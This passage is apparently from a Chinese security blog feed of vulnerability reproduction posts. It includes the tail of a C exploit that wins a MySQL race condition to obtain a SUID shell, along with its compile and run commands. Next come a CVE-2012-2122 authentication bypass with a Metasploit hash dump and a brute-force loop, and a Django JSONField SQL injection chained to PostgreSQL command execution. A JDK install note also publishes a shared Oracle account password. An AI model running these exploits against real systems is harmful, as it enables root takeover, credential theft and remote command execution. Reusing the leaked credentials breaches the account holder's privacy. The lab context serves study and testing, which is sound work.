fd = <span class="built_in">inotify_init</span>();</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to inotify_init\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = <span class="built_in">inotify_add_watch</span>(fd, EXP_PATH, IN_CREATE | IN_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Entering the race loop... Hang in there...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( is_shell_suid != <span class="number">1</span> ) &#123;</span><br><span class="line"></span><br><span class="line">        cnt++;</span><br><span class="line">	<span class="keyword">if</span> ( (cnt % <span class="number">100</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">	 	<span class="built_in">printf</span>(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">	 	<span class="comment">//fflush(stdout);	</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Create empty file , remove if already exists */</span></span><br><span class="line">        <span class="built_in">unlink</span>(MYSQL_TEMP_FILE);</span><br><span class="line">        <span class="built_in">unlink</span>(MYSQL_TAB_FILE);</span><br><span class="line">   	<span class="built_in">mysql_cmd</span>(<span class="string">&quot;DROP TABLE IF EXISTS exploit_table&quot;</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">mysql_cmd</span>(<span class="string">&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="string">&quot;&#x27;&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* random num if needed */</span></span><br><span class="line">        <span class="built_in">srand</span> ( <span class="built_in">time</span>(<span class="literal">NULL</span>) );</span><br><span class="line">        randomnum = ( <span class="built_in">rand</span>() % MAX_DELAY );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Fork failed :(\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Child process - executes REPAIR TABLE  SQL statement */</span></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">usleep</span>(<span class="number">500</span>);</span><br><span class="line">            <span class="built_in">unlink</span>(MYSQL_TEMP_FILE);</span><br><span class="line">	    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;REPAIR TABLE exploit_table EXTENDED&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// child stops here</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span></span><br><span class="line">        <span class="keyword">if</span> (pid &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">            io_notified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> processed = <span class="number">0</span>;</span><br><span class="line">                ret = <span class="built_in">read</span>(fd, buf, <span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">                <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (processed &lt; ret) &#123;</span><br><span class="line">                    event = (struct inotify_event *)(buf + processed);</span><br><span class="line">                    <span class="keyword">if</span> (event-&gt;mask &amp; IN_CLOSE) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(event-&gt;name, <span class="string">&quot;exploit_table.TMD&quot;</span>)) &#123;</span><br><span class="line">                            <span class="comment">//usleep(randomnum);</span></span><br><span class="line"></span><br><span class="line">			    <span class="comment">// Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span></span><br><span class="line">			    <span class="built_in">unlink</span>(MYSQL_TAB_FILE);</span><br><span class="line">			    myd_handle = <span class="built_in">open</span>(MYSQL_TAB_FILE, O_CREAT, <span class="number">0777</span>);</span><br><span class="line">			    <span class="built_in">close</span>(myd_handle);</span><br><span class="line">			    <span class="built_in">chmod</span>(MYSQL_TAB_FILE, <span class="number">04777</span>);</span><br><span class="line"></span><br><span class="line">			    <span class="comment">// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span></span><br><span class="line">                            <span class="built_in">unlink</span>(MYSQL_TEMP_FILE);</span><br><span class="line">                            <span class="built_in">symlink</span>(SUID_SHELL, MYSQL_TEMP_FILE);</span><br><span class="line">                            io_notified=<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    processed += <span class="built_in"><span class="keyword">sizeof</span></span>(struct inotify_event);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (io_notified) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check if SUID bit was set at the end of this attempt</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">lstat</span>(SUID_SHELL, &amp;st) == <span class="number">0</span> ) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (st.st_mode &amp; S_ISUID) &#123;</span><br><span class="line">		is_shell_suid = <span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n&quot;</span>, cnt);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;ls -l &quot;</span> SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(SUID_SHELL <span class="string">&quot; -p -i &quot;</span>);</span><br><span class="line">    <span class="comment">//system(SUID_SHELL &quot; -p -c &#x27;/bin/bash -i -p&#x27;&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* close MySQL connection and exit */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Job done. Exiting\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">mysql_close</span>(conn);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译exp；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span><br></pre></td></tr></table></figure>

<p>执行 EXP 提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库</span></span><br><span class="line">./mysql-privesc-race <span class="built_in">test</span> 123456 localhost <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104111549676.png" alt="image-20211104111549676"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL身份认证漏洞(CVE-2012-2122)</title>
    <url>/2021/11/03/Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E(CVE-2012-2122)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。 也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。</p>
<ul>
<li>参考：<a href="https://blog.csdn.net/weixin_41924764/article/details/113101932">https://blog.csdn.net/weixin_41924764/article/details/113101932</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<ul>
<li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li>
<li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li>
</ul>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker搭建；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># cd /opt/docker/vulhub/mysql/CVE-2012-2122/</span></span><br><span class="line">[root@localhost CVE-2012-2122]<span class="comment"># docker-compose up -d</span></span><br><span class="line">Creating network <span class="string">&quot;cve-2012-2122_default&quot;</span> with the default driver</span><br><span class="line">Pulling mysql (vulhub/mysql:5.5.23)...</span><br><span class="line">5.5.23: Pulling from vulhub/mysql</span><br><span class="line">22dc81ace0ea: Pull complete</span><br><span class="line">1a8b3c87dba3: Pull complete</span><br><span class="line">91390a1c435a: Pull complete</span><br><span class="line">07844b14977e: Pull complete</span><br><span class="line">b78396653dae: Pull complete</span><br><span class="line">fe8cde33ebc9: Pull complete</span><br><span class="line">eb305569f43b: Pull complete</span><br><span class="line">Digest: sha256:5bbb7570f16526da1de61e84487daade5614eb2a9bfd28a87bcf4d6795b94463</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> vulhub/mysql:5.5.23</span><br><span class="line">Creating cve-2012-2122_mysql_1 ... <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[root@localhost CVE-2012-2122]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE                 COMMAND                  CREATED         STATUS         PORTS                                       NAMES</span><br><span class="line">2365d270392c   vulhub/mysql:5.5.23   <span class="string">&quot;/bin/bash -c mysqld…&quot;</span>   5 minutes ago   Up 5 minutes   0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp   cve-2012-2122_mysql_1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考：<a href="https://blog.51cto.com/linuxgeek/998210">https://blog.51cto.com/linuxgeek/998210</a></p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>利用metasploit工具进行验证；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole </span></span><br><span class="line">/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb:38: warning: key <span class="string">&quot;Platform&quot;</span> is duplicated and overwritten on line 48</span><br><span class="line">[!] The following modules were loaded with warnings:</span><br><span class="line">[!] 	/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log <span class="keyword">for</span> details.</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.99-dev                          ]</span><br><span class="line">+ -- --=[ 2045 exploits - 1106 auxiliary - 345 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Use the edit <span class="built_in">command</span> to open the currently active module <span class="keyword">in</span> your editor</span><br><span class="line"></span><br><span class="line">[*] Starting persistent handler(s)...</span><br><span class="line">msf5 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">msf5 auxiliary(scanner/mysql/mysql_authbypass_hashdump) &gt; <span class="built_in">set</span> rhosts 192.168.220.132</span><br><span class="line">rhosts =&gt; 192.168.220.132</span><br><span class="line">msf5 auxiliary(scanner/mysql/mysql_authbypass_hashdump) &gt; run</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 The server allows logins, proceeding with bypass <span class="built_in">test</span></span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 10% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 20% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 30% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 40% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 50% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 60% complete</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Successfully bypassed authentication after 612 attempts. URI: mysql://root:COXazJ@192.168.220.132:3306</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Successfully exploited the authentication bypass flaw, dumping hashes...</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Hash Table has been saved: /root/.msf4/loot/20211103060402_default_192.168.220.132_mysql.hashes_563578.txt</span><br><span class="line">[*] 192.168.220.132:3306  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211103180612192.png" alt="image-20211103180612192"></p>
<p>存在此漏洞！</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>linux中执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 1000`; <span class="keyword">do</span> mysql -uroot -pwrong -h 192.168.220.132  ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211103180812294.png" alt="image-20211103180812294"></p>
<h2 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h2><ol>
<li>升级官方补丁；</li>
<li>更新MySQL。</li>
</ol>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>Django JSONField SQL注入漏洞(CVE-2019-14234&amp;CVE-2019-9193)</title>
    <url>/2021/11/11/Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2019-14234&amp;CVE-2019-9193)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开发。</p>
<p>什么是JSONField，Django是一个大而全的Web框架，其支持很多数据库引擎，包括Postgresql、Mysql、Oracle、Sqlite3等，但与Django天生为一对儿的数据库莫过于Postgresql了，Django官方也建议配合Postgresql一起使用。</p>
<p>相比于Mysql，Postgresql支持的数据类型更加丰富，其对JSON格式数据的支持也让这个关系型数据库拥有了NoSQL的一些特点。</p>
<p>参考：<a href="https://cloud.tencent.com/developer/article/1549898">https://cloud.tencent.com/developer/article/1549898</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>Django</p>
<p>1.11.x before 1.11.23</p>
<p>2.1.x before 2.1.11</p>
<p>2.2.x before 2.2.4</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.gitcd vulhub/django/CVE-2019-14234/docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://ip:8000可以正常访问说明搭建成功">http://ip:8000可以正常访问说明搭建成功</a>;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111165927552.png" alt="image-20211111165927552"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。</p>
<p>Django通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111165724976.png" alt="image-20211111165724976"></p>
<p>通过JSONField类获得KeyTransform类并生成sql语句的位置。</p>
<p>其中key_name是可控的字符串，最终生成的语句是WHERE (field-&gt;’[key_name]’) = ‘value’，因此可以进行SQL注入。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>浏览器访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:8000/admin/vuln/collection/</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111170100803.png" alt="image-20211111170100803"></p>
<p>构造URL进行查询;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:8000/admin/vuln/collection/?detail__a%27b=123</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111170206324.png" alt="image-20211111170206324"></p>
<p>注入成功!</p>
<p>结合CVE-2019-9193漏洞，验证命令注入语句，构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:8000/admin/vuln/collection/?detail__title&#x27;)%3d&#x27;1&#x27; or 1%3d1 %3bcreate table cmd_exec(cmd_output text)--%20</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111170550314.png" alt="image-20211111170550314"></p>
<p>页面结果出现报错。报错原因是<code>no results to fetch</code>，说明语句已经成功执行；</p>
<p>然后用<a href="http://dnslog.cn/">dnslog</a>检测是否可以执行命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:8000/admin/vuln/collection/?detail__title&#x27;)%3d&#x27;1&#x27; or 1%3d1 %3bcopy cmd_exec FROM PROGRAM &#x27;ping xxxx.dnslog.cn&#x27;--%20</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111171012284.png" alt="image-20211111171012284"></p>
<p>当然，也可以直接进入到容器，看到ping命令执行成功；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111171438501.png" alt="image-20211111171438501"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>Linux配置静态IP地址</title>
    <url>/2021/11/08/Linux%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81IP%E5%9C%B0%E5%9D%80/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>CentOS，是基于 Red Hat Linux 提供的可自由使用源代码的企业级 Linux 发行版本；是一个稳定，可预测，可管理和可复制的免费企业级计算平台。</p>
<ul>
<li>参考：<a href="https://blog.csdn.net/sjhuangx/article/details/79618865">https://blog.csdn.net/sjhuangx/article/details/79618865</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="配置CentOS静态IP"><a href="#配置CentOS静态IP" class="headerlink" title="配置CentOS静态IP"></a>配置CentOS静态IP</h2><ul>
<li>查看当前网卡名称;</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211108161031773.png" alt="image-20211108161031773"></p>
<p>centos7的网络IP地址配置文件在<code>/etc/sysconfig/network-scripts</code>文件夹下，ens192网卡对应的配置文件为ifcfg-ens192，使用vim编辑如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;         # 使用静态IP地址，默认为dhcp</span><br><span class="line">IPADDR=&quot;192.168.241.100&quot;   # 设置的静态IP地址</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;    # 子网掩码</span><br><span class="line">GATEWAY=&quot;192.168.241.2&quot;    # 网关地址</span><br><span class="line">DNS1=&quot;192.168.241.2&quot;       # DNS服务器</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;95b614cd-79b0-4755-b08d-99f1cca7271b&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;             #是否开机启用</span><br></pre></td></tr></table></figure>

<ul>
<li>重启网卡；</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure>

<h2 id="配置kali-Linux静态IP"><a href="#配置kali-Linux静态IP" class="headerlink" title="配置kali Linux静态IP"></a>配置kali Linux静态IP</h2><p>键入命令；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211108162943633.png" alt="image-20211108162943633"></p>
<p>编辑如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">inface eth0 inet static   # 设置 eth0 使用默认的静态地址</span><br><span class="line">address 10.10.10.160      # 设置 eth0 的ip 地址</span><br><span class="line">gateway 10.10.10.2        # 配置当前主机的默认网关</span><br><span class="line">netmask  255.255.255.0    # 设置 eth0 的子网掩码</span><br></pre></td></tr></table></figure>

<p>修改 <code>/etc/resolv.conf </code>文件，添加DNS；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>

<p>重启网卡;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/networking restart </span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>安全运维</category>
      </categories>
  </entry>
  <entry>
    <title>安装Java环境</title>
    <url>/2021/11/11/%E5%AE%89%E8%A3%85Java%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>本着帮助大家（自己）快速解决问题，节约时间的原则，这一篇还是记录一下安装Java环境。</p>
<p>参考：<a href="https://blog.csdn.net/userpass_word/article/details/103838606">https://blog.csdn.net/userpass_word/article/details/103838606</a></p>
<hr>
<span id="more"></span>

<h2 id="下载jdk"><a href="#下载jdk" class="headerlink" title="下载jdk"></a>下载jdk</h2><p>下载JDK安装包;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111190747909.png" alt="image-20211111190747909"></p>
<p>下载需要Oracle 帐户登录；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111191224706.png" alt="image-20211111191224706"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 感谢liwei大佬的共享(20211111)</span><br><span class="line">账号：liwei@xiaostudy.com</span><br><span class="line">密码：OracleTest1234</span><br></pre></td></tr></table></figure>

<h2 id="Linux安装jdk"><a href="#Linux安装jdk" class="headerlink" title="Linux安装jdk"></a>Linux安装jdk</h2><p>下载好后上传至Linux主机上，依次执行<strong>（注意：自个的路径要搞对！！！）</strong>；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 移动压缩包至opt目录</span><br><span class="line">mv jdk-11.0.5_linux-x64_bin.tar.gz /etc/opt</span><br><span class="line"> </span><br><span class="line">#切换至opt目录进行解压</span><br><span class="line">cd /etc/opt</span><br><span class="line"> </span><br><span class="line">#解压</span><br><span class="line">tar -zxvf jdk-11.0.5_linux-x64_bin.tar.gz</span><br><span class="line"> </span><br><span class="line">#拷贝解压后Java文件夹至/usr/bin</span><br><span class="line">cp -r jdk-11.0.5/ /usr/bin</span><br><span class="line"> </span><br><span class="line">#安装并注册</span><br><span class="line">update-alternatives --install /usr/bin/java java /etc/opt/jdk-11.0.5/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /etc/opt/jdk-11.0.5/bin/javac 1</span><br><span class="line">update-alternatives --set java /etc/opt/jdk-11.0.5/bin/java</span><br><span class="line">update-alternatives --set javac /etc/opt/jdk-11.0.5/bin/javac</span><br><span class="line"> </span><br><span class="line">#检查是否成功配置Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211111191418797.png" alt="image-20211111191418797"></p>
<h2 id="Windows安装jdk"><a href="#Windows安装jdk" class="headerlink" title="Windows安装jdk"></a>Windows安装jdk</h2><p>简单的批爆，下载上传后直接双击就安装了。（不在赘述……）</p>
]]></content>
      <categories>
        <category>安全运维</category>
      </categories>
  </entry>
  <entry>
    <title>Adobe ColdFusion 反序列化漏洞(CVE-2017-3066)</title>
    <url>/2021/11/12/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-3066)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
